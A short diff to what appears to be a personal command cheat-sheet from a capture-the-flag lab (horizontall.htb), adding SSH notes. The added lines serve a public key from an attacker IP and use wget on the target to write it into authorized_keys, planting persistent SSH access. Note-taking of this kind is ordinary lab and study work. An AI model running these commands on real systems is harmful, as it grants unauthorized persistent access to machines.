@@ -127,7 +127,13 @@ cat file.txt|xclip
 
 SSH
 ssh-keygen -f mykey
-cat mykey.pub # you can copy this to authorized_keys
+password
+python -m http.server 7878
+
+cd && mkdir .ssh && cd .ssh && wget http://10.10.14.42:7878/mykey.pub && mv mykey.pub authorized_keys
+
+ssh -i mykey developer@horizontall.htb
+password
 
 SSH port binding
 ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
